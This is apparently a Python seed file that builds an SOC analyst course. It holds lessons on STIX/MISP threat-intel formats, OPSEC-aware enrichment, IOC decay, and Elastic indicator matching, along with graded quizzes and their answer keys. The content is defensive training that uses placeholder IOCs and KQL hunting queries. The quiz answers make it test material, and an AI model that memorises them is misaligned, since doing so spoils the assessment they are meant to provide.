    M["malware"]
    I["indicator (pattern)"]
    O["observable / SCO"]
    S["sighting"]
    TA -->|attributed-to| IS
    IS -->|uses| AP
    IS -->|uses| M
    C -->|attributed-to| IS
    M -->|indicated-by| I
    I -->|based-on| O
    S -->|sighting-of| I
```

```mermaid
flowchart LR
    F1["MISP feed"]
    F2["OpenCTI"]
    F3["CSV drop"]
    F4["Vendor TAXII"]
    Norm["Normaliser (STIX 2.1 internal)"]
    Refang["Refang and validate"]
    Idx["ION indicator index"]
    Match["Elastic Indicator Match rules"]
    Alert["Alert"]
    F1 --> Norm
    F2 --> Norm
    F3 --> Norm
    F4 --> Norm
    Norm --> Refang --> Idx --> Match --> Alert
```

## Glossary

- **STIX 2.1 / TAXII** — OASIS standard format / companion transport.
- **SDO / SRO / SCO** — STIX domain objects / relationships / cyber observables.
- **MISP** — OSS threat intel platform; events, attributes, objects, tags, galaxies.
- **OpenCTI** — STIX-2.1-native OSS TIP; ION's upstream.
- **TLP / PAP** — Traffic Light Protocol (sharing) / Permissible Actions Protocol (actions).
- **Defanging / refanging** — Breaking / restoring IOCs for human-shareable text.

## Further reading

- OASIS STIX 2.1 spec: https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1.html
- MISP documentation: https://www.misp-project.org/documentation/
- OpenCTI documentation: https://docs.opencti.io/
- FIRST TLP 2.0: https://www.first.org/tlp/
""",
    )
    m5l2q = _add_lesson(
        session, mod5, order=4, title="STIX/MISP/TLP/PAP — quiz",
        lesson_type=LessonType.QUIZ, duration_min=6,
        content_md="Three questions on PAP enforcement, STIX SDO classification, and refanging.",
    )
    _add_q(session, m5l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="A peer SOC sends you an email tagged *TLP:AMBER, PAP:RED* listing five domains tied to a current intrusion. Which of the following is permitted?",
        options=[
            {"value": "urlscan", "label": "Submitting one of the domains to urlscan.io"},
            {"value": "internal", "label": "Searching internal DNS logs for any of the domains"},
            {"value": "forward", "label": "Forwarding the email to a public security mailing list"},
            {"value": "curl", "label": "curl-ing one of the domains from a SOC analyst workstation"},
        ],
        correct="internal",
        explanation_md="PAP:RED forbids any action that touches attacker infrastructure or third-party services the adversary might watch. Internal log searches are passive and stay inside your perimeter. The other three options either expose the indicator publicly or actively probe it.",
        points=2,
    )
    _add_q(session, m5l2q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of these are STIX Domain Objects (SDOs)?",
        options=[
            {"value": "indicator", "label": "indicator"},
            {"value": "relationship", "label": "relationship"},
            {"value": "malware", "label": "malware"},
            {"value": "attack_pattern", "label": "attack-pattern"},
            {"value": "sighting", "label": "sighting"},
        ],
        correct=["indicator", "malware", "attack_pattern"],
        explanation_md="SDOs are the *things* in the STIX graph (indicator, malware, attack-pattern, threat-actor, etc.). `relationship` and `sighting` are SROs — the edges that connect SDOs.",
        points=3,
    )
    _add_q(session, m5l2q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="Defanging an IOC like `evil[.]example` changes its meaning, so a SIEM rule that ingests the defanged value will fail to match real traffic.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** A SIEM matches the literal string. Defanged values must be refanged on ingestion before being placed into the indicator index, otherwise no real DNS query for `evil.example` will hit the rule.",
        points=2,
    )

    # Lesson 5.3 — reputation & OPSEC
    m5l3 = _add_lesson(
        session, mod5, order=5,
        title="Reputation services, enrichment, and OPSEC",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Read a VirusTotal result without overweighting the detection ratio
> 2. Choose between active and passive enrichment based on PAP rating and OPSEC risk
> 3. Use abuse.ch (URLhaus, ThreatFox, MalwareBazaar), AbuseIPDB, OTX, Shodan/Censys, and passive DNS appropriately
> 4. Identify the OPSEC mistake of submitting a fresh hash/sample/URL to a public service against a live adversary
> 5. Walk a fresh-C2-domain triage end-to-end without tipping the adversary

## What enrichment is for

The detection rule tells you **that** an observable matched. Enrichment tells you **what** the observable is — who else has seen it, when it appeared, what malware family it's associated with, what the IP's hosting reality looks like, what the domain's resolution history is.

The catch: **the act of looking can be observed.** Nearly every popular reputation service is monitored — by abuse researchers, by competing CTI teams, and (the OPSEC trap) sometimes by the adversary themselves.

## VirusTotal

**VirusTotal** (Google/Chronicle) aggregates ~70 antivirus and threat-intel engines plus structured metadata.

What to read on a VT result:

- **Detection ratio** (e.g. *"32/72"*) — useful at a glance, **deeply unreliable for fresh samples.** First hours of a campaign typically show 0/72 because vendors haven't analysed.
- **Vendor verdicts** — individual engines as data points, not ground truth. Cross-reference, never blind-trust.
- **First / Last Submission, Submission Names** — *first-submission timestamp is genuinely informative.* If a hash was first submitted to VT 3 minutes before your alert fired, you're watching a fresh campaign. Submission filenames hint at the lure language.
- **Behaviour tab** — sandbox detonation: dropped files, network connections, registry changes, command lines, mutexes. Gold for understanding what a sample does.
- **Relations / Graph** — pivots: other files, URLs, domains, IPs associated with this hash.
- **Comments** — community annotations. Variable quality; researchers tag with malware family / campaign IDs.
- **Files containing this hash, with this signer, similar files (vhash, ssdeep)** — pivot points.

**Free vs paid.** Public web UI gives verdict + basic metadata. **VT Intelligence** (paid) gives advanced search, Retrohunt (YARA against VT's full corpus historically), Livehunt (notify on future matches), and API quotas for automation.

## AbuseIPDB

Community-driven IP reputation. The IP page shows **Confidence of Abuse** (0–100), reports timeline, ISP / ASN data. *"Confidence"* reflects what other community members reported, **not** a deep analysis. **A high score is a strong signal; a low score means nothing has been reported, not that the IP is clean.** Fresh attacker infrastructure has low scores until burned.

## abuse.ch services

Swiss non-profit running several free, open feeds:

- **URLhaus** — feed of malicious URLs distributing malware. Each entry: URL, status (online/offline), threat (e.g. `malware_download`), tags.
- **ThreatFox** — IOCs tied to live malware families with the family name attached. Excellent for hash/IP/domain enrichment with attribution.
- **MalwareBazaar** — sample-sharing platform. Researchers upload samples; download with caveats.
- **Feodo Tracker / SSL Blacklist** — narrower feeds (banking-trojan C2 IPs, malicious certs).

These feeds are typically TLP:CLEAR — querying them is generally TLP-safe. Nonetheless, *could the adversary be watching these feeds for their own infrastructure?* still applies.

## AlienVault OTX

**OTX** (Open Threat Exchange, now LevelBlue) is community-curated — **pulses** are themed IOC collections. Quality varies enormously: some pulses are excellent published research; others are auto-generated from honeypots. Treat as one data source; check the pulse author.

## Shodan and Censys

Passive scan databases. They continuously scan the public IPv4 (and parts of IPv6) space, recording open ports, banners, TLS certificates, HTTP responses, inferred software.

For L1:
- Confirming what services an attacker IP exposes — generic VPS? Known proxy? **Cobalt Strike Team Server with the default 50050 banner exposed?**
- Pivoting on TLS certificates — find every IP presenting a particular self-signed cert.
- Finding clusters — Shodan/Censys queries like `ssl.cert.subject.cn:"example.test" port:443` reveal sibling infrastructure.

Shodan/Censys data is **passive from your perspective** — you read their database; the scan happened earlier from the platform's infrastructure. Right tool when you need infrastructure intel without touching the adversary.

## Passive DNS

**Passive DNS (PDNS)** services collect DNS responses observed in the wild — never queries from your network specifically, but DNS responses seen by sensors at recursive resolvers worldwide. L1 uses PDNS to answer:

- *What IPs has `cdn-update.example` resolved to in the last 90 days?*
- *What domains have ever resolved to `192.0.2.45`?*
- *When did this domain first appear in DNS?*

This matters operationally: at the moment your alert fired, the malicious domain may have been resolving to one IP; by the time you investigate, it points elsewhere. **PDNS reconstructs resolution at alert time.**

Major sources: RiskIQ / Microsoft Defender Threat Intelligence (formerly PassiveTotal), Farsight DNSDB (DomainTools), SecurityTrails, CIRCL's free PDNS. **All are passive — adversary cannot see you query.**

## The OPSEC trap

The cardinal mistake every L1 must learn:

> *You see a fresh, never-before-seen domain in an alert. You paste it into VirusTotal to "see what VT knows." VT records the submission. The adversary, who has VT Intelligence and a Livehunt rule on their own infrastructure, gets a notification: "your domain just got searched." They burn the domain, rotate, and your investigation is dead.*

This is real. Adversaries with operational maturity monitor public reputation platforms for first-submission events on their infrastructure. Submitting a sample, hash, URL, or domain to VT, urlscan, AnyRun, Hybrid Analysis, or any public sandbox is an **active** action — even though no traffic touches the attacker's servers, the platform itself becomes a side-channel.

This is what PAP:RED is designed to forbid. Why a careful L1 prefers passive enrichment when stealth matters:

- Passive DNS instead of `dig` or `nslookup`.
- Shodan/Censys cached banners instead of `nmap`.
- Internal DNS logs, proxy logs, NetFlow, conn.log instead of any external query.
- VT search by hash *only when the hash is already known to VT and your search adds no new information* — i.e. the hash is in a public report. **If unsure, don't.**

**Every external lookup is an action you cannot undo. Treat it as one.**

## Worked example — fresh C2 domain

**Scenario.** At 10:14 an Elastic alert fires for an internal workstation making a DNS request to `cdn-update[.]example`. The domain isn't in any feed. What now?

**Step 1 — Internal data first.** Always. Free and invisible.
- DNS logs: how many hosts queried this domain, when did queries start, what types?
- Proxy / web gateway: did anything fetch HTTP(S)? URI paths, response sizes?
- Zeek `conn.log` (Module 4): outbound connections to whatever IP it resolved to — duration, bytes, frequency. C2 beaconing has telltale low-byte, high-regularity patterns.
- EDR / Sysmon Event 22 (Module 3): which process initiated the resolution?

**Step 2 — Passive external.**
- Passive DNS: when did this domain first appear? What IPs has it resolved to? Are those IPs already on watchlists?
- Whois (effectively passive — registry servers don't tip the adversary): registration date, registrar, registrant if not privacy-protected.
- Shodan/Censys for PDNS-returned IPs: what services run there? Known-abused VPS provider?

**Step 3 — Decide on active enrichment.**
- Read PAP. PAP:RED → stop, escalate to L2 with what you have.
- PAP:AMBER → internal-only continues. No external active queries.
- PAP:GREEN / unmarked + SOC policy allows → may submit *only the domain string* to VT. Even this is observable.
- PAP:WHITE → all options open.

**Step 4 — Document.** In the ION case: every query (internal and external), every external service touched (with timestamps), the PAP rating applied and why, your verdict and confidence.

This audit trail matters when L2/L3 takes over, when retrospectives ask whether you tipped the adversary, and when CTI writes the after-action report.

```mermaid
flowchart LR
    subgraph Passive["Passive (no adversary signal)"]
        P1["Internal DNS / proxy / EDR logs"]
        P2["Passive DNS"]
        P3["Shodan / Censys cached scans"]
        P4["Existing CTI feeds"]
    end
    subgraph Active["Active (potentially observable)"]
        A1["VirusTotal / urlscan / AnyRun submissions"]
        A2["Direct DNS lookup against attacker domain"]
        A3["nmap / curl / ping of attacker IP"]
        A4["Sandbox detonation"]
    end
    Passive -->|prefer first| Decision["Triage decision"]
    Active -->|only if PAP allows| Decision
```

```mermaid
flowchart TD
    Start["IOC needs enrichment"]
    Q1{"PAP rating?"}
    Q2{"Already in public feeds?"}
    Q3{"Internal data sufficient?"}
    Pas["Passive enrichment only"]
    Act["Active enrichment permitted"]
    Stop["Escalate to L2 — do not query"]
    Start --> Q1
    Q1 -->|RED| Stop
    Q1 -->|AMBER| Pas
    Q1 -->|GREEN or WHITE| Q2
    Q2 -->|Yes, public| Act
    Q2 -->|No, fresh| Q3
    Q3 -->|Yes| Pas
    Q3 -->|No| Act
```

## Glossary

- **VirusTotal / VT Intelligence** — aggregate AV/CTI verdicts; paid tier adds Retrohunt/Livehunt.
- **abuse.ch** — URLhaus, ThreatFox, MalwareBazaar, Feodo Tracker, SSL Blacklist.
- **AbuseIPDB** — community IP reputation; *Confidence of Abuse* score.
- **OTX (LevelBlue)** — community pulses; quality varies — read the author.
- **Shodan / Censys** — passive scan databases for IP/cert intel.
- **Passive DNS (PDNS)** — historical DNS resolution database, queryable invisibly.
- **Active vs passive enrichment** — adversary-observable vs not.

## Further reading

- abuse.ch: https://abuse.ch/
- VirusTotal API docs: https://docs.virustotal.com/
- AbuseIPDB: https://www.abuseipdb.com/
- AlienVault OTX (LevelBlue): https://otx.alienvault.com/
- Shodan: https://www.shodan.io/
- Censys: https://search.censys.io/
- CIRCL Passive DNS: https://www.circl.lu/services/passive-dns/
""",
    )
    m5l3q = _add_lesson(
        session, mod5, order=6, title="Reputation & OPSEC — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on TLP-vs-PAP semantics, passive-source identification, VT detection-ratio interpretation, and the OPSEC risk of sample submission.",
    )
    _add_q(session, m5l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="A SHA-256 hash for an unknown payload was published in a reputable public CTI report this morning, with TLP:GREEN and PAP:GREEN markings. Submitting that hash to VirusTotal is:",
        options=[
            {"value": "forbidden_tip", "label": "Forbidden — any submission tips the adversary"},
            {"value": "permitted_public", "label": "Permitted — the hash is already public via the report; a VT search adds no new operational signal"},
            {"value": "forbidden_tlp", "label": "Forbidden — TLP:GREEN means no external systems"},
            {"value": "upload", "label": "Permitted only if you upload the file as well"},
        ],
        correct="permitted_public",
        explanation_md="TLP governs sharing, PAP governs actions. PAP:GREEN allows queries that don't produce *new* operational exposure, and a hash already in a public report no longer reveals anything. Confusing TLP and PAP is a common mistake — TLP:GREEN does not block external queries.",
        points=2,
    )
    _add_q(session, m5l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *passive* enrichment sources from the analyst's perspective?",
        options=[
            {"value": "pdns", "label": "Querying Farsight DNSDB for historical resolutions"},
            {"value": "urlscan", "label": "Submitting a fresh domain to urlscan.io"},
            {"value": "shodan", "label": "Searching Shodan for cached scan data on an IP"},
            {"value": "dig", "label": "Running dig +short against the attacker domain from your laptop"},
            {"value": "zeek", "label": "Searching internal Zeek dns.log for the domain"},
        ],
        correct=["pdns", "shodan", "zeek"],
        explanation_md="PDNS, Shodan cached data, and internal log searches do not generate any signal an adversary could observe. urlscan submissions and direct dig queries against the attacker domain are active.",
        points=3,
    )
    _add_q(session, m5l3q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="A *0/72* detection ratio on VirusTotal for a fresh sample reliably means the file is benign.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** A 0/72 verdict is common for the first hours of a fresh campaign because vendor signature engines haven't analysed the sample. Detection ratio is a lagging indicator and must never be used as sole evidence of benignity.",
        points=2,
    )
    _add_q(session, m5l3q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="In one or two sentences, name a specific OPSEC risk of submitting a suspicious binary as a *file* (not just its hash) to VirusTotal during triage of a suspected targeted intrusion.",
        options=None,
        correct=["adversary VT Intelligence livehunt notification", "adversary subscribes to first-submissions and gets notified", "VT Intelligence Livehunt rule notifies adversary their malware was submitted", "first-submission alert tips the adversary", "exposes the file to other Intelligence subscribers including the adversary", "adversary watches VT for first-submissions of their samples"],
        explanation_md="An adversary with VirusTotal Intelligence can subscribe to first-submissions matching their own samples (by YARA, IMPHASH, or similarity) and be alerted that their malware was just submitted by an unknown party — signalling the intrusion has been detected. The submission also makes the file available to other Intelligence subscribers, including the adversary if they pay. PAP:RED and PAP:AMBER explicitly forbid this for live targeted intrusions.",
        points=3,
    )

    # Lesson 5.4 — lifecycle & matching in ION
    m5l4 = _add_lesson(
        session, mod5, order=7,
        title="IOC lifecycle, matching in ION, and decay",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Walk an indicator through its lifecycle: production → ingestion → enrichment → distribution → matching → triage → feedback → decay
> 2. Apply type-appropriate decay policies — hashes never expire automatically, IPs decay fastest, domains intermediate, URLs short
> 3. Read an Elastic Indicator Match alert and identify the joined fields under `threat.indicator.*`
> 4. Build KQL queries that match hashes, IPs, domains, and URLs against ECS-mapped fields
> 5. Walk an IOC-hit triage end to end — confirm match, pivot to host (Module 3) and network (Module 4), classify, write a sighting, escalate

## The lifecycle, end to end

An indicator does not appear from nowhere and live forever. It moves through stages, and an L1 sees it at every one:

1. **Production.** A CTI team observes activity, extracts observables, adds context (family, kill-chain phase, ATT&CK techniques, validity window), publishes as STIX bundle / MISP event / feed.
2. **Ingestion.** ION (or any TIP/SIEM) pulls the bundle on a schedule, normalises to internal representation, refangs, validates types, writes to the indicator index.
3. **Enrichment.** The indicator is decorated with cross-references — links to malware SDO, threat-actor SDO, ATT&CK techniques, prior sightings, related observables.
4. **Distribution.** Pushed to detection engines: Elastic Indicator Match rules, EDR watchlists, firewall blocklists, web-proxy filters.
5. **Matching.** A piece of telemetry — a hash in a process event, an IP in a conn.log row, a domain in a DNS request — joins to the indicator and produces an alert.
6. **Triage.** L1 classifies as **TP** (true positive), **FP** (false positive), or **BTP** (benign true positive — *yes, indicator matched, but the activity was authorised, e.g. red team test*).
7. **Feedback.** L1 records a sighting, an FP marker, and analyst notes. Flows back to the TIP and contributes to the indicator's score.
8. **Decay / expiry.** Based on age, sightings, and explicit `valid_until`, the indicator's confidence drops over time.

```mermaid
flowchart LR
    P["Production"]
    I["Ingestion"]
    E["Enrichment"]
    D["Distribution"]
    M["Matching"]
    T["Triage"]
    F["Feedback"]
    X["Decay / expiry"]
    P --> I --> E --> D --> M --> T --> F --> X
    F -.->|score back to feed| P
```

## Indicator decay and expiry

Different IOC types have very different lifespans:

- **Hashes.** A SHA-256 of a malware sample is functionally permanent — that exact byte sequence will always be malicious. **Not auto-expired** by most TIPs. A hash from 2017 still matches the same file in 2027.
- **IPs.** Cloud IPs rotate fast. Common policy: **30 days** of active matching after last sighting; afterward decays out of indicator-match index but stays queryable for retrospective analysis. Sightings reset the timer.
- **Domains.** More variable. A dedicated malicious domain (typosquat, DGA seed) may stay malicious for the lifetime of the registration; common **90 days to 1 year**. A *compromised legitimate* domain (hacked WordPress for two weeks) needs a **shorter** expiry, not longer — once cleaned up, continuing to alert is harmful.
- **URLs.** Often very short-lived — phishing kits move within hours/days. Policies of **7–30 days** common.
- **TTPs and YARA rules.** No expiry; reviewed periodically as families evolve.

**MISP's "decaying indicators" model** assigns each indicator a base score (e.g. 80) and a decay function (linear, exponential, sigmoid) parameterised by half-life. Time without sightings drops the score; each sighting boosts it. Below a threshold (commonly 25), the indicator stops being pushed to detection engines but remains in the database for historical lookup.

**OpenCTI's `valid_until`** is simpler — explicit end-of-life timestamp, after which the indicator is no longer "live." STIX 2.1's `valid_from` / `valid_until` map directly.

ION combines both: STIX-derived `valid_until` honoured if present, otherwise type-based defaults apply (hashes never decay, IPs 30 days from last sighting, domains 90 days, URLs 14 days). **Sightings reset the timer.**

## Matching IOCs in ION/Elastic

Indicators are written into a dedicated index pattern, often `logs-ti_*`. Detection runs through **Indicator Match** rules: a rule joins source events against the indicator index at search time and fires when a field of the source event equals a field of the indicator.

Mental model:

> *For every event in `logs-endpoint-*` or `logs-network-*` in the last N minutes, check whether `event.field` equals `indicator.field` for any indicator in `logs-ti_*` whose `valid_from` ≤ now ≤ `valid_until`. If yes, raise an alert with both records joined.*

ECS field paths the L1 will recognise from Modules 3/4:

| Source side | Indicator side | What's matched |
| --- | --- | --- |
| `file.hash.sha256` | `threat.indicator.file.hash.sha256` | A file's SHA-256 |
| `process.hash.sha256` | `threat.indicator.file.hash.sha256` | The hash of the running executable |
| `source.ip` / `destination.ip` | `threat.indicator.ip` | An IP either side of a connection |
| `dns.question.name` | `threat.indicator.url.domain` | DNS query name |
| `url.full` | `threat.indicator.url.full` | Full URL |
| `tls.client.ja3` | `threat.indicator.tls.client.ja3` | JA3 fingerprint |

Sample KQL for ad-hoc hunting (not the rules themselves):

```kql
file.hash.sha256 : "a3f1c9b8e2d4a7f6b5c8e1d2a3f4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2"
```

```kql
destination.ip : "203.0.113.45" and event.category : "network"
```

```kql
dns.question.name : "cdn-update.example" or dns.question.name : "*.cdn-update.example"
```

```kql
url.full : "http://198.51.100.10/login.php" or url.domain : "cdn-update.example"
```

When a rule fires, the alert document carries both the source event and the matched indicator under `threat.indicator.*`. L1 reads the alert and sees *which* indicator matched, *which* feed it came from, and *what* context (family, ATT&CK technique) is attached.

For deep field-path detail on network telemetry — `source.ip`, `destination.port`, `network.bytes`, `dns.question.*`, `tls.*` — refer back to **Module 4**. For host-side fields — `process.executable`, `process.parent.name`, `file.path`, `registry.key` — refer back to **Module 3**.

## Sightings

A **sighting** in STIX 2.1 is an SRO that says *"this indicator was matched in my environment at this time, this many times, by these systems."* When L1 confirms a TP, ION writes a sighting back to OpenCTI/MISP with:
- `sighting_of_ref` — the indicator referenced.
- Count of matches.
- `first_seen` / `last_seen` timestamps.
- `observed_data_refs` linking to the SCOs that matched (without exposing internal hostnames or user identities upstream).
- Optionally `confidence`.

**Why sightings matter:**
- For **your own SOC**, sightings let the team measure feed efficacy. *"Feed X has produced 247 sightings in 90 days, 82 % TP"* is manageable; *"Feed Y has produced 4 sightings, all FP"* is a retirement candidate.
- For the **producing CTI team**, sightings validate that their work catches things in real environments — shapes what the community prioritises.
- For **decay**, sightings reset/boost the score, keeping useful indicators alive.

L1 typically doesn't write sightings by hand; ION generates them on classification. The L1's job is to classify accurately.

## False-positive markers

Marking an alert FP in ION:
1. Closes the case with reason FP.
2. Decrements the indicator's confidence score in the local TIP cache.
3. Optionally pushes an FP marker upstream to MISP/OpenCTI as a negative sighting.

**Why aggressive FP marking matters.** An indicator generating daily FP alerts costs the SOC analyst hours every week. Worse, it teaches analysts to mute or ignore alerts from that source — *which is how real intrusions get missed.* If you find yourself acknowledging the same FP for the third time, escalate the **indicator** (not just the alert) to CTI or the senior analyst. Either: the indicator is wrong (a benign IP), the matching context is too broad (CDN-shared IP without scoping), or the rule is wrong (matching a non-load-bearing field).

**FP fatigue erodes a feed's credibility within days.** Aggressive, specific FP marking — with notes explaining why — is how a feed stays trustworthy.

## Worked example — IOC hit triage end to end

**Scenario.** At 09:14 your ingestion job pulls a fresh CTI feed update. Among the indicators is a SHA-256:

```
b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2
```

— labelled *"Initial-stage dropper for the March 2026 wave; TLP:GREEN, PAP:AMBER, valid_until 2026-06-14, indicates malware:Emotet, attack-pattern:T1566.001."*

At 11:02 the same morning, an Elastic Indicator Match rule fires on `WKS-04127`:

```json
{
  "@timestamp": "2026-04-29T11:02:14.318Z",
  "host.name": "WKS-04127",
  "user.name": "j.doe",
  "process.executable": "C:\\\\Users\\\\j.doe\\\\Downloads\\\\invoice_apr29.exe",
  "process.hash.sha256": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2",
  "process.parent.name": "explorer.exe",
  "threat.indicator.file.hash.sha256": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2",
  "threat.indicator.name": "Initial-stage dropper for the March 2026 wave",
  "threat.feed.name": "internal-cti-feed-1",
  "event.kind": "alert"
}
```

**(a) Confirm the hit.** Both `process.hash.sha256` and `threat.indicator.file.hash.sha256` match — rule joined correctly. Sanity-check: real user, managed asset, plausible path (`C:\\Users\\j.doe\\Downloads\\invoice_apr29.exe` looks like a downloaded payload from an email lure).

**(b) Sysmon context — Module 3 callback.** Pivot to Sysmon for `WKS-04127` around 11:02 ± 5 min:
- Sysmon ID 1 (Process Create) for that hash — confirm parent (`explorer.exe` from the alert; consistent with user-double-click, *not* a parent Office app).
- Sysmon ID 11 (FileCreate) for the executable — when did it land on disk?
- Sysmon ID 15 (FileCreateStreamHash) — was a `Zone.Identifier` ADS attached? (Indicates downloaded from internet.)
- Sysmon ID 22 (DnsQuery) shortly after process start — any suspicious resolutions?

**(c) Network context — Module 4 callback.** Pivot to Zeek for `WKS-04127` from process-start onward:
- `dns.log` — new domains queried within seconds of `invoice_apr29.exe` starting?
- `conn.log` — outbound connections, especially repeated short-byte connections to a single destination (beaconing).
- `http.log` / `ssl.log` — JA3? SNI matching a known C2 family?

A clean dropper-to-C2-beacon chain (process executes → DNS query for fresh domain → outbound TLS to that resolved IP every ~60 s with jitter) is a high-confidence TP.

**(d) Classify.** TP. Hash matched, parent process consistent with user execution, network behaviour consistent with the family the indicator labels (Emotet).

**(e) Sighting.** ION writes a sighting back to OpenCTI: `sighting_of_ref: indicator--<id>`, count 1, first_seen / last_seen `2026-04-29T11:02:14Z`. Local indicator score is boosted; upstream feed gets sighting count incremented.

**(f) Escalate.** Initial-access malware on a user workstation with confirmed C2 beaconing — escalate to L2 with: case ID, hash and indicator UUID, asset and user, C2 domain and IP from conn.log, the chain of Sysmon events, MITRE techniques observed (T1566.001 spearphishing attachment if email-sourced; T1204.002 user execution; T1071.001 web protocols for C2), recommended containment (EDR isolate, reset creds).

Total triage time, with practice and the data already in ION: **10–20 minutes.** *The IOC match was the entry point, not the answer. Modules 3 and 4 fed the answer.*

```mermaid
flowchart TD
    Hit["Indicator match alert"]
    Conf["Confirm match"]
    Host["Host context (Module 3)"]
    Net["Network context (Module 4)"]
    V{"Verdict"}
    TP["True positive"]
    FP["False positive"]
    BTP["Benign true positive"]
    Sight["Write sighting"]
    FPmark["Mark FP, comment why"]
    Esc["Escalate to L2"]
    Close["Close with note"]
    Hit --> Conf --> Host
    Conf --> Net
    Host --> V
    Net --> V
    V -->|TP| Sight --> Esc
    V -->|FP| FPmark --> Close
    V -->|BTP| Sight --> Close
```

## Glossary

- **Indicator lifecycle** — Production → ingestion → enrichment → distribution → matching → triage → feedback → decay.
- **TP / FP / BTP** — True positive / false positive / benign true positive.
- **Indicator Match rule** — Elastic detection that joins source events against the indicator index.
- **Sighting** — STIX 2.1 SRO recording an indicator was matched in your environment.
- **Decay / valid_until** — Confidence drop / explicit expiry timestamp.

## Further reading

- ECS Threat fields: https://www.elastic.co/guide/en/ecs/current/ecs-threat.html
- MISP Decaying Indicators model: https://www.misp-project.org/2019/05/14/Decaying-Indicators-Of-Compromise.html/
- OpenCTI documentation: https://docs.opencti.io/
""",
    )
    m5l4q = _add_lesson(
        session, mod5, order=8, title="Lifecycle & matching — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on decay state, ECS hash field paths, hash-vs-IP decay policy, and FP-marking discipline.",
    )
    _add_q(session, m5l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An IP-address indicator was last sighted in your environment 45 days ago, and your ION expiry policy is *30 days since last sighting.* What is the indicator's current state?",
        options=[
            {"value": "deleted", "label": "Deleted from the system"},
            {"value": "active", "label": "Still being actively pushed to detection engines"},
            {"value": "decayed", "label": "Decayed out of the active match index but retained for historical lookup"},
            {"value": "tombstoned", "label": "Permanently tombstoned and never queryable"},
        ],
        correct="decayed",
        explanation_md="The standard decay model retires an indicator from active matching once the policy threshold is exceeded, but keeps it queryable for retrospective hunting. It is not deleted, and it is not still actively matching.",
        points=2,
    )
    _add_q(session, m5l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which Elastic ECS field paths would correctly match a hash-type IOC against host telemetry?",
        options=[
            {"value": "file_hash", "label": "file.hash.sha256"},
            {"value": "process_hash", "label": "process.hash.sha256"},
            {"value": "dst_ip", "label": "destination.ip"},
            {"value": "dns_q", "label": "dns.question.name"},
            {"value": "parent_hash", "label": "process.parent.hash.sha256"},
        ],
        correct=["file_hash", "process_hash", "parent_hash"],
        explanation_md="Hash-bearing fields under ECS live on `file`, `process`, and `process.parent`. `destination.ip` is for IP indicators; `dns.question.name` is for domain indicators.",
        points=3,
    )
    _add_q(session, m5l4q, order=3, kind=QuestionKind.SINGLE,
        stem_md="A SHA-256 indicator was published 3 years ago tied to a long-dormant malware family. What is the most appropriate decay treatment?",
        options=[
            {"value": "auto90", "label": "Auto-delete after 90 days regardless of type"},
            {"value": "indef", "label": "Retain indefinitely; cryptographic hashes do not naturally decay"},
            {"value": "ip30", "label": "Apply the same 30-day decay used for IP indicators"},
            {"value": "fp_remove", "label": "Remove it once a single FP is recorded"},
        ],
        correct="indef",
        explanation_md="A SHA-256 of a known malicious sample never becomes benign — the byte sequence either is or is not the malware. Decay policies apply mostly to IPs, domains, and URLs, not hashes.",
        points=2,
    )
    _add_q(session, m5l4q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="Aggressively marking false positives on a feed is harmful because it makes the feed appear less reliable than it really is.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False — the opposite is true.** Aggressive, specific FP marking surfaces broken indicators and broken matching contexts so the CTI team can fix them. Failing to mark FPs is what breaks a feed — alert fatigue erodes trust and trains analysts to miss real intrusions.",
        points=2,
    )

    # ── Module 6 — Phishing Triage ───────────────────────────────────────
    # End-to-end phishing alert triage: taxonomy, email auth (SPF/DKIM/DMARC/
    # ARC), lure analysis, attachment+link triage, gateway+EDR telemetry,
    # AiTM/OAuth/MFA-fatigue specifics, user-reported pipeline, decision
    # framework, ATT&CK mapping, three worked scenarios.
    mod6 = _add_module(
        session, course, order=6,
        title="Phishing Triage",
        description_md=(
            "Working a phishing alert end-to-end as an L1: phishing "
            "taxonomy (credential / malware / BEC / consent / AiTM / "
            "quishing), the two `From` addresses and reading "
            "Authentication-Results, lure analysis and lookalike "
            "domains, attachment + link triage with OPSEC limits, "
            "Microsoft 365 / Defender / EDR pivot patterns, the AiTM "
            "session-cookie theft pattern, illicit OAuth consent and "
            "post-takeover BEC, the user-reported phishing pipeline, "
            "and a defensible escalate / contain / close decision."
        ),
        estimated_minutes=210,
    )

    # Lesson 6.1 — Phishing taxonomy & email anatomy
    m6l1 = _add_lesson(
        session, mod6, order=1,
        title="Phishing taxonomy and email authentication",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Distinguish credential phishing, malware delivery, BEC, consent phishing, AiTM, smishing/vishing, and quishing — and explain why each produces a different triage workflow
> 2. Read the difference between RFC 5321 envelope From and RFC 5322 header From, and describe what each lets an attacker spoof
> 3. Walk a `Received:` chain bottom-up to find the first untrusted relay
> 4. Interpret an `Authentication-Results:` header — SPF, DKIM, DMARC, compauth — and reason about what each does and does *not* prove
